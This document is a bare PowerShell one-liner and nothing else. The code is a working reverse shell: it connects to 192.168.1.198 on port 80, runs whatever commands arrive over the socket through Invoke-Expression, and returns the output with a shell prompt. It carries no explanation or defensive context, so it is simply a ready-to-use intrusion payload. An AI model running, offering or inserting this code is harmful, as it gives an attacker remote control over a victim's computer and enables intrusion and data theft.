$C = New-Object System.Net.Sockets.TCPClient("192.168.1.198",80);$S = $C.GetStream();[byte[]]$B = 0..65535|%{0};while(($I = $S.Read($B, 0, $B.Length)) -ne 0){;$D = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($B,0, $I);$SB = (iex $D 2>&1 | Out-String );$SB2 = $SB + "PS " + (pwd).Path + "> ";$Sb = ([text.encoding]::ASCII).GetBytes($SB2);$S.Write($Sb,0,$Sb.Length);$S.Flush()};$C.Close()
